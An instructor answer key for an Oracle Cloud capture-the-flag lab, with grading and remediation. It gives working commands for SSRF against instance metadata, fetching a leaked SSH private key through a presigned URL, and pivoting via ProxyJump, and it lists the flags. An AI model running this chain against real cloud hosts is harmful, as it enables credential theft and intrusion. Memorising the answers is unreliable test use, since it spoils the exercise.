# CloudBreach Range — Instructor Key (ground truth)

Full exact chain, real commands, against a genuinely deployed OCI range (see
`../terraform/`). Nothing here is simulated — every command below hits real
OCI services and real Compute instances.

---

## Stage 1: SSRF → reach OCI instance metadata

The `/preview` route in `app/web_app.py` fetches any URL server-side, and
forwards an optional `headers=` JSON param through untouched — that's what's
needed here, since OCI IMDS v2 requires `Authorization: Bearer Oracle` on
every GET request (a static, publicly-documented value, not a per-session
secret — a much weaker mitigation than AWS's IMDSv2 token flow, but still a
real requirement to satisfy).

```bash
curl -G "https://<web01_domain>/preview" \
  --data-urlencode "url=http://169.254.169.254/opc/v2/instance/metadata/" \
  --data-urlencode 'headers={"Authorization":"Bearer Oracle"}'
```

Response includes the custom metadata keys set at launch:
```json
{
  "backup_recovery_url": "https://objectstorage.<region>.oraclecloud.com/p/<token>/n/<namespace>/b/cloudbreach-secrets/o/internal01-ssh-key.pem",
  "backup_recovery_notes": "Meridian ops: internal-01 recovery key, rotate quarterly per ticket MERI-4471"
}
```

## Stage 2: Follow the presigned Object Storage URL

The `backup_recovery_url` value is a genuine OCI Pre-Authenticated Request
(PAR) — a presigned URL, OCI's equivalent of an S3 presigned link. It needs
**no further authentication at all**, not even the `Bearer Oracle` header:

```bash
curl -G "https://<web01_domain>/preview" \
  --data-urlencode "url=<the backup_recovery_url value>"
```
(or just `curl` it directly if it's reachable from your own machine too —
PARs work over the open internet by design, they're not restricted to
in-VCN traffic)

Response body is the raw PEM-encoded SSH private key for `internal-01`.
Save it and fix permissions:
```bash
curl -s "<backup_recovery_url>" > internal01_key.pem
chmod 600 internal01_key.pem
```

## Stage 3: Find internal-01's private IP

Not embedded anywhere on purpose — this is the "recon inside a network
you've partially compromised" step. Options, in rough order of realism:

- `terraform output internal01_private_ip` if you have operator access to
  the Terraform state (not the intended path, but fine for grading/testing)
- From `web-01` itself (once you have any shell there, e.g. via further
  exploitation beyond this range's intended scope): `ip route`, or scan the
  private subnet CIDR (`10.0.2.0/24` per this range's `network.tf`) —
  `internal-01` is the only host answering on port 22 there
- In a real assessment: OCI Search / `oci compute instance list` if you'd
  also compromised a set of credentials with that permission (out of scope
  for this range's intended chain, but worth discussing in a writeup as
  "what a more privileged foothold would additionally expose")

## Stage 4: Lateral movement via SSH ProxyJump

```bash
scp -i <your admin key> internal01_key.pem ubuntu@<web01_domain>:~/
ssh -i internal01_key.pem -o ProxyJump=ubuntu@<web01_domain> ubuntu@<internal01_private_ip>
```

## Stage 5: Proof

```bash
cat /home/ubuntu/flag.txt
# flag{fd16978f423c836c563079917db6978a}
cat /opt/meridian-internal/customer-export-notice.txt
```

---

## Flag reference

| Stage | Flag | Notes |
|---|---|---|
| 1–2 (metadata + PAR leak) | `flag{ebf88885ddcaf4ac84b44c698c0cbdfd}` | Award for successfully retrieving the raw SSH private key content via the metadata → PAR chain — no embedded string in the response itself to check automatically, self-verify by confirming the PEM parses (`openssl rsa -in internal01_key.pem -check`) |
| 5 (lateral movement) | `flag{fd16978f423c836c563079917db6978a}` | Embedded on `internal-01`, `/home/ubuntu/flag.txt` |

---

## Remediation (what you'd actually tell Meridian Freight Co.)

| Finding | Fix |
|---|---|
| SSRF in `/preview` | Validate/allow-list target hosts; block the `169.254.169.254`/link-local range explicitly at minimum; strip/ignore any attacker-supplied `Authorization` header rather than forwarding it verbatim |
| Presigned URL stashed in instance metadata | Never place credential material (including presigned URLs) in instance metadata — use Instance Principals + a proper secrets service instead, and treat metadata as attacker-readable the moment any SSRF exists anywhere on the host |
| PAR with no IP/network restriction | OCI PARs can't be network-scoped, which is exactly why they shouldn't hold long-lived credential-equivalent material — prefer short TTLs and rotate immediately after use if a PAR must be used at all |
| No IMDS access monitoring | OCI Cloud Guard / Audit logs would flag unusual `GetObject` access patterns on the bucket from outside the expected caller in a real environment |

---

## Grading rubric (100 pts, adjust as needed)

| Criterion | Points |
|---|---|
| Demonstrated reaching OCI IMDS v2 through the SSRF (correct header bypass) | 20 |
| Correctly enumerated custom instance metadata and identified the leaked URL | 15 |
| Retrieved the actual SSH private key via the PAR | 20 |
| Correctly identified `internal-01`'s private IP through legitimate recon | 10 |
| Demonstrated actual shell/file access on `internal-01` (not just "could reach it") | 25 |
| Write-up: clear narrative + differentiated remediation priorities | 10 |

---

## Known limitations / honest caveats

- **Live-verified end-to-end 2026-08-25** against a real deployed range
  (tenancy region `ap-singapore-1`): SSRF → `Bearer Oracle` header bypass →
  instance metadata → `backup_recovery_url` → real PAR → real SSH private
  key (`openssl rsa -check` confirmed valid) → SSH pivot through `web-01`
  into `internal-01` (no public IP) → flag + notes file both confirmed. One
  transient OCI-side error hit during the very first `terraform apply`
  (`internal01`'s boot volume prep failed, instance auto-terminated,
  `terraform state rm` + re-apply fixed it in one retry) — not a bug in this
  Terraform config, a known-occasional OCI Compute launch flake; if you hit
  the same "problem occurred while preparing the instance's remote boot
  volume" error, just retry the same way.
- **Two real bugs hit and fixed while adding the HTTPS/full-site redesign
  (same date):**
  1. OCI instance metadata has a **32000-byte total cap**. The first version
     of `web01.sh.tpl` base64-encoded `web_app.py` *inside* the script, then
     `base64gzip()`'d the whole script again for `user_data` — once the app
     grew into a full multi-page site (~25KB), that double-base64 overhead
     pushed total metadata to ~48KB and `terraform apply` failed outright
     with `InvalidParameter: Metadata size ... cannot be larger than 32000
     bytes`. Fixed by embedding the raw file content directly in a quoted
     heredoc (no inner base64 layer) and switching the outer encoding from
     `base64encode()` to `base64gzip()` (cloud-init auto-detects gzip'd
     user-data after base64 decoding) — comfortably under the cap now.
  2. Ubuntu images on OCI ship with **host-level iptables rules that only
     allow inbound 22/tcp by default**, independent of NSG rules — an NSG
     allow on 80/443 is necessary but not sufficient. First HTTPS deploy sat
     up (nginx `active (running)`, cert generated correctly) but was
     completely unreachable externally until `iptables -I INPUT -p tcp
     --dport {80,443} -j ACCEPT` + `netfilter-persistent save` were added to
     `web01.sh.tpl`. Same class of gotcha the original port-5000 version of
     this range hit (see git history) — check host iptables, not just the
     NSG, whenever "service is up but unreachable" on an OCI box.
- **Self-signed cert upgraded to a real trusted Let's Encrypt certificate**
  (same date) — the browser "Not secure" warning on the self-signed cert was
  a fair thing to want fixed, and nip.io domains resolve for real, so
  Certbot's HTTP-01 challenge works against them exactly like any other
  domain. Required widening `web01_ingress_http`'s NSG rule from
  `allowed_cidr` to `0.0.0.0/0` (Let's Encrypt's validation servers connect
  from all over the world, not just the operator's IP) — port 80 only ever
  serves the ACME challenge path and a redirect to 443, so this is the
  standard low-risk pattern, not a real widening of the attack surface; 443
  (the actual app) stays scoped to `allowed_cidr`. `web01.sh.tpl` now runs
  Certbot automatically on every boot (best-effort, falls back to the
  self-signed cert if it fails) so a fresh `terraform apply` gets a real
  cert without a manual step. Verified live: `openssl x509` showed
  `issuer=... O=Let's Encrypt`, and a plain `curl` (no `-k`) succeeded.
- **Operational note, not a design bug**: while making the above change, an
  `terraform apply` invocation got killed by a tool-level timeout mid-flight
  after it had already issued the destroy call against the old `web-01` but
  before the replacement finished creating — the range was briefly down
  (`web-01` terminated, nothing else affected) until a follow-up apply
  recreated it. Always run `terraform apply`/`destroy` in a way that can't
  get killed mid-operation (background it, or give it a timeout comfortably
  longer than instance launch takes, ~45-60s here).
- **web-01's public IP was ephemeral through all of the above** — every
  `metadata`/`user_data` edit forces the OCI provider to destroy+recreate
  the instance (`metadata` is `ForceNew`), and an ephemeral public IP gets
  re-randomized on every recreate. Fine during active iteration, a real
  problem once docs reference a specific domain/IP as ground truth. Fixed
  by switching `web01` to a **RESERVED** public IP
  (`oci_core_public_ip.web01` in `compute.tf`, `assign_public_ip = false`
  on the instance's own VNIC instead): the IP address value now belongs to
  the tenancy, not the instance, and Terraform re-attaches it to whatever
  the current `web-01` instance is on every apply (see the
  `data.oci_core_private_ips.web01` → `oci_core_public_ip.web01` chain) —
  no dependency cycle, since `web01.sh.tpl` self-detects its own domain at
  boot via `checkip.amazonaws.com` rather than Terraform injecting it, so
  the instance's `user_data` never has to reference the public IP resource
  and create a circular dependency. Verified: switching to this changed the
  IP **one last time** (a plain in-place `assign_public_ip` toggle, 3s, no
  instance replacement) to `140.245.110.167` — this is now the permanent
  address as long as `oci_core_public_ip.web01` itself is never destroyed.
  One manual step was still needed after that one-time switch: since the
  instance wasn't recreated, its already-issued Let's Encrypt cert still
  matched the *old* domain — ran `certbot --nginx -d
  soulsecure.140.245.110.167.nip.io` once by hand to reissue for the new
  one. Future edits that force a real instance recreation won't need this
  manual step (Certbot runs automatically in `web01.sh.tpl` on every boot);
  it was only necessary this once because this particular change was an
  in-place update, not a recreate.
- **Migrated from the nip.io domain to a real DuckDNS name** (same date,
  right after the above): `soulsecure.duckdns.org`, free, registered at
  duckdns.org, A record pointed at the reserved IP. Requested purely for a
  cleaner-looking URL (no IP visible in the hostname) — functionally
  identical to the nip.io setup otherwise. `duckdns_domain` is now a
  Terraform variable (`variables.tf`, default `"soulsecure.duckdns.org"`)
  baked directly into `web01.sh.tpl` rather than self-detected via
  `checkip.amazonaws.com`, so both the fallback self-signed cert and the
  real Let's Encrypt cert Certbot requests on every boot use it correctly
  from a totally fresh instance with zero manual steps — verified by
  letting this specific change force a real web-01 recreation and watching
  Certbot succeed automatically for `soulsecure.duckdns.org` on first boot.
  An earlier attempt at also auto-updating the DuckDNS A record via a
  Terraform `null_resource` + `local-exec` was reverted — Windows'
  `cmd.exe`-based local-exec mangled the curl command's quoting (exit
  status 3, malformed URL); not worth fighting for what's pure insurance
  on top of the reserved IP fix, which already means the IP doesn't need
  re-pointing under normal operation. See `compute.tf`'s comment for the
  manual `curl .../update?...` command if the reserved IP is ever
  genuinely reassigned.
- **Current permanent address**: `https://soulsecure.duckdns.org/` — every
  example below uses `<web01_domain>` as a placeholder, but as of this
  section this specific value shouldn't change again.
- OCI IMDS's exact `Authorization` header enforcement has changed over time
  across image/agent versions — if `Bearer Oracle` doesn't work as shown,
  check what the actual 401/403 response body from `/opc/v2/` says on your
  specific image; it self-documents the expected header.
- `oci_core_images` picks the most recent Canonical Ubuntu 22.04 image
  available for the chosen shape at apply time — not pinned to one immutable
  image OCID, so a fresh `terraform apply` months from now may pick up a
  newer point release. Shouldn't change the exploit chain, but note it if
  something behaves differently than described here.
- Object Storage bucket names (`cloudbreach-secrets`) must be unique per
  OCI namespace (effectively per-tenancy) — if you're running more than one
  copy of this range in the same tenancy, rename the bucket in `storage.tf`.
